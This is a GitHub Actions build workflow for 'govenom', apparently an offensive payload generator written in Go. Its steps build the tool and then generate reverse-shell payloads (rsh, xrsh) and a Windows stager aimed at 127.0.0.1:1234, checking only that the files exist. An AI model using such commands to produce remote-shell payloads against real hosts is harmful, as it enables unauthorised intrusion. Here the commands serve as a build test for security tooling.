name: Build
on: [push]
jobs:
  build_govenom:
    name: "build govenom"
    runs-on: ubuntu-latest
    steps:

      - name: "Set up Go"
        uses: actions/setup-go@v2
        with:
          go-version: 1.14.x
        id: go

      - name: "Check out code"
        uses: actions/checkout@v1

      - name: "build govenom"
        run: |
          make setup
          make build

      - name: "build govenom for windows"
        run: |
          GOOS=windows go build

  build_payloads:
    name: "build payloads"
    runs-on: ubuntu-latest
    steps:

      - name: "Set up Go"
        uses: actions/setup-go@v2
        with:
          go-version: 1.14.x
        id: go

      - name: "Check out code"
        uses: actions/checkout@v1

      - name: "build govenom"
        run: |
          make setup
          make build

      - name: "build rsh for linux"
        run: |
          ./govenom payload rsh -d 127.0.0.1:1234 -o rsh

      - name: "build rsh for windows"
        run: |
          GOOS=windows ./govenom payload rsh -d 127.0.0.1:1234 -o rsh.exe

      - name: "build xrsh for linux"
        run: |
          ./govenom payload xrsh -d 127.0.0.1:1234 -o xrsh

      - name: "build xrsh for windows"
        run: |
          GOOS=windows ./govenom payload xrsh -d 127.0.0.1:1234 -o xrsh.exe

      - name: "build stager for windows"
        run: |
          GOOS=windows ./govenom payload stager -d 127.0.0.1:1234 -o stager.exe

      - name: "Check file existence"
        uses: andstor/file-existence-action@v1
        with:
          files: "rsh, rsh.exe, xrsh, xrsh.exe, stager.exe"
